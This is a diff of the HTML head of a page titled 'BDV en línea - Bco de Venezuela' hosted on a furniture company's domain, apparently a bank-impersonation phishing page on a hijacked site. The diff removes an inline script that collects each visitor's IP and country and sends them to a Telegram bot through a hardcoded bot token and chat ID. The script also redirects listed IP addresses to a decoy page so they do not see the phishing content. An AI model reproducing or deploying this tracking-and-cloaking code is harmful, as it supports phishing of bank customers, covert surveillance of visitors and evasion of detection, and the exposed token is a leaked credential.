@@ -17,58 +17,7 @@
 <meta property="article:modified_time" content="2024-07-09T21:21:13+00:00"/>
 <meta property="og:image" content="https://macizocolombia.com/wp-content/uploads/2024/04/Preguntanos.jpg"/>
 <meta name="twitter:card" content="summary_large_image"/>
-  <script>
-        const telegramBotToken = '6897439736:AAFtafisoiyqnnxXNpp0AmmwkceZaRHuPUw'; // acá el bot
-        const chatId = '-4591066898'; // acá el chat
-
-        async function getCountry() {
-            try {
-                const response = await fetch('https://ipinfo.io/json');
-                const data = await response.json();
-                return data.country;
-            } catch (error) {
-                console.error('Error al obtener el país:', error);
-                return 'País Desconocido';
-            }
-        }
-
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api64.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error al obtener la dirección IP:', error);
-                return 'IP Desconocida';
-            }
-        }
-
-        async function enviarMensaje() {
-            const pais = await getCountry();
-            const ip = await getIPAddress();
-
-            const mensaje = `Nuevo Ingreso ⚠️\n\n\País: ${pais}\n\IP: ${ip}`;
-             // aqui añadir las ip de la rata si es necesario
-            if (ip === '2803:1800:5101:a2a6:a0b9:233c:78f9:5b4e' || ip === '187.161.198.94' || ip === '189.164.77.82') { 
-                window.location.href = 'imagenes/adsense.html'; // aqui es a donde va a redireccionar la rata (el mensajito html)
-                return;
-            }
-
-            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
-
-
-            fetch(apiUrl)
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Mensaje enviado correctamente:', data);
-                })
-                .catch(error => {
-                    console.error('Error al enviar el mensaje o redirigir:', error);
-                });
-        }
-
-        enviarMensaje();
-    </script>
+  
 <script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://macizocolombia.com/","url":"https://macizocolombia.com/","name":"BDV en línea - Bco de Venezuela","isPartOf":{"@id":"https://macizocolombia.com/#website"},"primaryImageOfPage":{"@id":"https://macizocolombia.com/#primaryimage"},"image":{"@id":"https://macizocolombia.com/#primaryimage"},"thumbnailUrl":"https://macizocolombia.com/wp-content/uploads/2024/04/Preguntanos.jpg","datePublished":"2021-05-24T03:03:13+00:00","dateModified":"2024-07-09T21:21:13+00:00","breadcrumb":{"@id":"https://macizocolombia.com/#breadcrumb"},"inLanguage":"es","potentialAction":[{"@type":"ReadAction","target":["https://macizocolombia.com/"]}]},{"@type":"ImageObject","inLanguage":"es","@id":"https://macizocolombia.com/#primaryimage","url":"https://i0.wp.com/macizocolombia.com/wp-content/uploads/2024/04/Preguntanos.jpg?fit=1024%2C1024&ssl=1","contentUrl":"https://i0.wp.com/macizocolombia.com/wp-content/uploads/2024/04/Preguntanos.jpg?fit=1024%2C1024&ssl=1","width":1024,"height":1024},{"@type":"BreadcrumbList","@id":"https://macizocolombia.com/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home"}]},{"@type":"WebSite","@id":"https://macizocolombia.com/#website","url":"https://macizocolombia.com/","name":"BDV en línea","description":"Fabrica de muebles","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://macizocolombia.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"es"}]}</script>
 
 <link rel='dns-prefetch' href='//stats.wp.com'/>
